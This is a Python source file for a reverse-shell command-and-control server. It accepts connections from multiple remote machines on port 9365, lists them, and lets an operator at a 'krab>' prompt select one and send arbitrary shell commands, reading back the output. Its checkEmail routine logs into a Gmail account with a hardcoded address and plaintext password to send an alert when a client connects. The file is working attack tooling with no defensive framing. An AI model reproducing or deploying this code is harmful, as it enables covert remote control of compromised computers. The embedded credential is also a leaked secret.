import socket
import sys
from smtplib import SMTP_SSL
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]#Thread 1 is for connection handling. Thread 2 is for client commands
queue = Queue()

all_connections = []
all_addresses = []
global key
key=False

# Creating Socket(Allowing 2 connections)
def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9365
		s = socket.socket()

	except socket.error as msg:
		print("Error creating socket: "+str(msg))

# Binding socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Error binding socket: "+str(msg)+"\nRetrying...")
		time.sleep(5)
		socket_bind()

# Establish connections from multiple clients and save to list
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			conn, address=s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
		except:
			print("Error accepting a connections.")
	print(all_connections)
def checkEmail():
        global key
        if key==False:
                if len(all_connections)>0:
                        try:
                                key=True
                                subject = 'Hello'
                                msg = MIMEMultipart()
                                username="perf3ctodst@gmail.com"
                                password="F4nt4sy7sungs4Mpi312"
                                msg['From'] = username
                                msg['To'] = username
                                msg['Subject'] = subject
                                body="Hi"
                                msg.attach(MIMEText(body,'plain'))
                                text = msg.as_string()


                                serv=SMTP_SSL('smtp.gmail.com',465)
                                serv.ehlo()
                                msg="Hi"
                                serv.login(username,password)
                                serv.sendmail(username,username,msg)
                                print("Sent!")
                                
                        except:
                                pass
                


# Creating interactive prompt for sending commands remotely
def start_krab():
	while True:
		cmd = input("krab> ")
		if cmd == 'list':
			list_connections()
			continue
		elif cmd == 'check':
			while True:
				checkEmail()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)

		else:
			print("Command not recognised...\n")


def list_connections():
	results=''
	for i,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(40480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += "ID:"+str(i)+"   Address:"+str(all_addresses[i][0])+"   Port:"+str(all_addresses[i][1])+"\n"
	print("---- CLIENTS ----\n"+results)


def get_target(cmd):
	try:
		target = cmd.replace("select ","")
		target = int(target)
		conn = all_connections[target]
		print("Now connected to " + str(all_addresses[target][0])+" on port "+str(all_addresses[target][1]))
		print(str(all_addresses[target][0]) + "> ",end="")
		return conn
	except:
		print("Not a valid selection..?")
		return None

# Connect with remote targe client
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), 'utf-8')
				print(client_response, end="")
			if cmd == "quit":
				break
		except:
			print("Connection was probably lost.")
			break
def create_workers():
	for _ in range (NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do next job in queue
def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x == 2:
			start_krab()
		queue.task_done()


#Each item is a new job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

create_workers()
create_jobs()
